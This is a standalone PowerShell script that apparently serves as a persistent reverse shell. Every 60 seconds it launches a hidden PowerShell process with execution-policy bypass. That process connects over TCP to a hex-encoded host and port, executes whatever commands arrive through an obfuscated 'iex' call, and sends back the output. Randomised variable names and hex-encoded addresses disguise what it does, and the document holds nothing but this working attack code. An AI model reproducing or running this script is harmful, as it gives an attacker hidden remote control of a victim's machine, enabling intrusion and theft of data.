while (1 -eq 1)
{
    Start-Sleep -Seconds 60
    Start-Process -FilePath $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop $lcWnT91nr3 = New-Object System.Net.Sockets.TCPClient('0xc0a80111',0x1194);$AMOlllKGlo = $lcWnT91nr3.GetStream();[byte[]]$BaPObSNyU0 = 0..65535|%{0};while(($HucYb7eid1 = $AMOlllKGlo.Read($BaPObSNyU0, 0, $BaPObSNyU0.Length)) -ne 0){;$Vj2gBc1bTP = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($BaPObSNyU0,0, $HucYb7eid1);$tKNZyiCEai = (i''ex $Vj2gBc1bTP 2>&1 | Out-String );$NsAE38jQ2u = $tKNZyiCEai + '<:izCy87iNfo:> ' + (pwd).Path + '> ';$sOHm6Tmy7g = ([text.encoding]::ASCII).GetBytes($NsAE38jQ2u);$AMOlllKGlo.Write($sOHm6Tmy7g,0,$sOHm6Tmy7g.Length);$AMOlllKGlo.Flush()};$lcWnT91nr3.Close()} -WindowStyle Hidden
}